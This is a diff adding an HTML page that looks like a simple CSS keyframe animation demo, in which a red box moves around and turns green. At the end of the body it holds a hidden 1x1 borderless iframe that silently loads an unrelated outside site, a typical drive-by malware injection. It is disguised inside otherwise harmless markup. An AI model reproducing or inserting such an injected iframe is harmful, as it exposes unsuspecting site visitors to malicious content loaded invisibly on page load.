@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title></title>
+		<style  type="text/css">
+			.div1{
+				width: 100px;
+				height: 100px;
+				position: relative;
+				background-color: red;
+				animation:yidong 5s  infinite   normal;
+				-webkit-animation:yidong 5s  linear  infinite  normal  ;
+			}
+			
+			@keyframes yidong{
+				
+				0%{ top: 0px;  }
+				25%{top: 200px; left: 100px;  }
+				50%{ top: 100px; left: 200px; background-color: green;  }
+				100%{ top: 300px; left:50px ;    }
+				
+			}
+			@-webkit-keyframes yidong{
+					0%{ top: 0;  }
+				25%{top: 200px; left: 100px;  }
+				50%{ top: 100px; left: 200px; background-color: green;  }
+				100%{ top: 300px; left:50px ;    }
+			}
+			
+			
+			
+		</style>
+		
+		
+	</head>
+	<body>
+		
+		<div class="div1" ></div>
+		
+	<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
